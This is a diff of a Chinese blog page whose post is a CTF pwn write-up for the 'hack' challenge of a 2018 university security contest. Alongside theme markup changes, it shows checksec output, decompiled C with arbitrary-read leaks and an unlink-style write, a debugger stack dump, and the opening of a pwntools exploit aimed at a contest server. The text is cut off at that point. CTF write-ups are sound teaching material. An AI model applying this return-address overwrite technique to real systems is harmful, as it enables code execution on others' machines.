@@ -1,489 +1,335 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>2018-高校网络信息安全管理运维挑战赛-pwn-writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="挂机pwn手，赛后复现…….各位大佬是真的强 hack防护机制： 1234567☁  HACK  checksec hack [*] &amp;apos;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary f">
-<meta name="keywords" content="writeup,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2018-高校网络信息安全管理运维挑战赛-pwn-writeup">
-<meta property="og:url" content="http://yoursite.com/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="挂机pwn手，赛后复现…….各位大佬是真的强 hack防护机制： 1234567☁  HACK  checksec hack [*] &amp;apos;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary f">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1542699913905.png">
-<meta property="og:image" content="http://yoursite.com/picture/1542802476359.png">
-<meta property="og:image" content="http://yoursite.com/picture/1542802511064.png">
-<meta property="og:updated_time" content="2019-01-02T08:08:58.235Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018-高校网络信息安全管理运维挑战赛-pwn-writeup">
-<meta name="twitter:description" content="挂机pwn手，赛后复现…….各位大佬是真的强 hack防护机制： 1234567☁  HACK  checksec hack [*] &amp;apos;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary f">
-<meta name="twitter:image" content="http://yoursite.com/picture/1542699913905.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>2018-高校网络信息安全管理运维挑战赛-pwn-writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">2018-高校网络信息安全管理运维挑战赛-pwn-writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-11-20 11:10:05" itemprop="dateCreated datePublished" datetime="2018-11-20T11:10:05+08:00">2018-11-20</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-01-02 16:08:58" itemprop="dateModified" datetime="2019-01-02T16:08:58+08:00">2019-01-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF-s-writeup/" itemprop="url" rel="index"><span itemprop="name">CTF's writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Tuesday, November 20th 2018, 11:10 am
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.7k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      9 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>挂机pwn手，赛后复现…….各位大佬是真的强</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>挂机pwn手，赛后复现…….各位大佬是真的强</p>
 <h3 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  HACK  checksec hack </span><br><span class="line">[*] &apos;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>程序逻辑</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *buf; <span class="comment">// ST18_4</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// ST24_4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ST2C_4</span></span><br><span class="line"></span><br><span class="line">  prepare();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The address of printf is: %p\n"</span>, <span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Suppose there is a struct like: "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"struct node &#123;\n\tchar *name;\n\tchar *description;\n\tstruct node *next;\n\tstruct node *prev;\n&#125;;"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And you have a chance to fabricate a fake node struct;\nWhat can you do?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Besides you can have two chances to leak, input address: "</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x14</span>u);</span><br><span class="line">  buf = v3;</span><br><span class="line">  v3[read(<span class="number">0</span>, v3, <span class="number">0xF</span>u) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v5 = atoll(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d, %p\n"</span>, v5, *v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Second chance: "</span>);</span><br><span class="line">  buf[read(<span class="number">0</span>, buf, <span class="number">0xF</span>u) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v6 = atoll(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d, %p\n"</span>, v6, *v6);</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The address of the node is %p, and you can input the fake node now: "</span>, v7);</span><br><span class="line">  read(<span class="number">0</span>, v7, <span class="number">0x10</span>u);</span><br><span class="line">  v8 = v7[<span class="number">3</span>];</span><br><span class="line">  v9 = v7[<span class="number">2</span>];</span><br><span class="line">  *(v8 + <span class="number">8</span>) = v9;</span><br><span class="line">  *(v9 + <span class="number">0xC</span>) = v8;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>☁  HACK  checksec hack 
+[*] &#39;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>程序逻辑</p>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char *v3; // eax
+  char *buf; // ST18_4
+  _DWORD *v5; // eax
+  _DWORD *v6; // eax
+  _DWORD *v7; // ST24_4
+  int v8; // ST28_4
+  int v9; // ST2C_4
+
+  prepare();
+  printf(&quot;The address of printf is: %p\n&quot;, puts);
+  puts(&quot;Suppose there is a struct like: &quot;);
+  puts(&quot;struct node {\n\tchar *name;\n\tchar *description;\n\tstruct node *next;\n\tstruct node *prev;\n};&quot;);
+  puts(&quot;And you have a chance to fabricate a fake node struct;\nWhat can you do?&quot;);
+  puts(&quot;Besides you can have two chances to leak, input address: &quot;);
+  v3 = malloc(0x14u);
+  buf = v3;
+  v3[read(0, v3, 0xFu) - 1] = 0;
+  v5 = atoll(buf);
+  printf(&quot;%d, %p\n&quot;, v5, *v5);
+  puts(&quot;Second chance: &quot;);
+  buf[read(0, buf, 0xFu) - 1] = 0;
+  v6 = atoll(buf);
+  printf(&quot;%d, %p\n&quot;, v6, *v6);
+  v7 = malloc(0x14u);
+  printf(&quot;The address of the node is %p, and you can input the fake node now: &quot;, v7);
+  read(0, v7, 0x10u);
+  v8 = v7[3];
+  v9 = v7[2];
+  *(v8 + 8) = v9;
+  *(v9 + 0xC) = v8;
+  return 0;
+}
+</code></pre>
 <p>程序先给了两次任意地址泄露的机会，然后再最后实现了一个类似于unlink的操作，导致可以任意地址写。</p>
 <p>利用思路：</p>
 <blockquote>
 <p>main函数返回时 ，返回地址存放在栈上，通过任意地址写将 main函数的返回地址改写成one_gadget</p>
 </blockquote>
 <p>main函数返回时进行的操作以及栈的情况</p>
-<p><img src="/picture/1542699913905.png" alt="1542699913905"></p>
+<p><img src="/picture/1542699913905.png" srcset="/img/loading.gif" alt="1542699913905"></p>
 <p>main函数返回时的stack</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffb4aed0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffb4aed4</span> ◂— <span class="number">0x0</span></span><br><span class="line">02:0008│      0xffb4aed8 —▸ 0x9de7008 ◂— '4151692732'</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffb4aedc</span> ◂— <span class="number">0xb</span> <span class="comment">/* '\x0b' */</span></span><br><span class="line">04:0010│      0xffb4aee0 —▸ 0xf775cdbc (environ) —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 ('QT_Q')</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffb4aee4</span> —▸ <span class="number">0x9de7020</span> —▸ <span class="number">0xf75e3819</span> (__strtold_nan+<span class="number">137</span>) ◂— jl     <span class="number">0xf75e383f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffb4aee8</span> —▸ <span class="number">0xffb4aeec</span> —▸ <span class="number">0x9de7024</span> —▸ <span class="number">0xf75e3819</span> (__strtold_nan+<span class="number">137</span>) ◂— jl     <span class="number">0xf75e383f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│ edx  <span class="number">0xffb4aeec</span> —▸ <span class="number">0x9de7024</span> —▸ <span class="number">0xf75e3819</span> (__strtold_nan+<span class="number">137</span>) ◂— jl     <span class="number">0xf75e383f</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│      <span class="number">0xffb4aef0</span> —▸ <span class="number">0xf775b3dc</span> (__exit_funcs) —▸ <span class="number">0xf775c1e0</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│      <span class="number">0xffb4aef4</span> —▸ <span class="number">0x9de7024</span> —▸ <span class="number">0xf75e3819</span> (__strtold_nan+<span class="number">137</span>) ◂— jl     <span class="number">0xf75e383f</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│ ebp  <span class="number">0xffb4aef8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>c│      <span class="number">0xffb4aefc</span> —▸ <span class="number">0xf75c1637</span> (__libc_start_main+<span class="number">247</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>│      <span class="number">0xffb4af00</span> —▸ <span class="number">0xf775b000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">0</span>e:<span class="number">0038</span>│      <span class="number">0xffb4af08</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">003</span>c│      <span class="number">0xffb4af0c</span> —▸ <span class="number">0xf75c1637</span> (__libc_start_main+<span class="number">247</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│      <span class="number">0xffb4af10</span> ◂— <span class="number">0x1</span></span><br><span class="line">11:0044│      0xffb4af14 —▸ 0xffb4afa4 —▸ 0xffb4c2ae ◂— './hack'</span><br><span class="line">12:0048│      0xffb4af18 —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 ('QT_Q')</span><br><span class="line"><span class="number">13</span>:<span class="number">004</span>c│      <span class="number">0xffb4af1c</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">泄露出来的<span class="built_in">stack</span>的地址和ebp的偏移</span><br><span class="line">pwndbg&gt; p <span class="number">0xffb4afac</span> - <span class="number">0xffb4aef4</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0xb8</span></span><br><span class="line"></span><br><span class="line">只要将ebp<span class="number">-4</span>出修改为one_gadget，那么就可以控制程序执行流</span><br></pre></td></tr></table></figure>
+<pre><code class="c">pwndbg&gt; stack 20
+00:0000│ esp  0xffb4aed0 ◂— 0x1
+01:0004│      0xffb4aed4 ◂— 0x0
+02:0008│      0xffb4aed8 —▸ 0x9de7008 ◂— &#39;4151692732&#39;
+03:000c│      0xffb4aedc ◂— 0xb /* &#39;\x0b&#39; */
+04:0010│      0xffb4aee0 —▸ 0xf775cdbc (environ) —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 (&#39;QT_Q&#39;)
+05:0014│      0xffb4aee4 —▸ 0x9de7020 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl     0xf75e383f
+06:0018│      0xffb4aee8 —▸ 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl     0xf75e383f
+07:001c│ edx  0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl     0xf75e383f
+08:0020│      0xffb4aef0 —▸ 0xf775b3dc (__exit_funcs) —▸ 0xf775c1e0 (initial) ◂— 0x0
+09:0024│      0xffb4aef4 —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl     0xf75e383f
+0a:0028│ ebp  0xffb4aef8 ◂— 0x0
+0b:002c│      0xffb4aefc —▸ 0xf75c1637 (__libc_start_main+247) ◂— add    esp, 0x10
+0c:0030│      0xffb4af00 —▸ 0xf775b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+... ↓
+0e:0038│      0xffb4af08 ◂— 0x0
+0f:003c│      0xffb4af0c —▸ 0xf75c1637 (__libc_start_main+247) ◂— add    esp, 0x10
+10:0040│      0xffb4af10 ◂— 0x1
+11:0044│      0xffb4af14 —▸ 0xffb4afa4 —▸ 0xffb4c2ae ◂— &#39;./hack&#39;
+12:0048│      0xffb4af18 —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 (&#39;QT_Q&#39;)
+13:004c│      0xffb4af1c ◂— 0x0
+
+泄露出来的stack的地址和ebp的偏移
+pwndbg&gt; p 0xffb4afac - 0xffb4aef4
+$1 = 0xb8
+
+只要将ebp-4出修改为one_gadget，那么就可以控制程序执行流
+</code></pre>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'210.32.4.16'</span>,<span class="string">'13375'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"leak libc address "</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">p.recvuntil(<span class="string">"input address: \n"</span>)</span><br><span 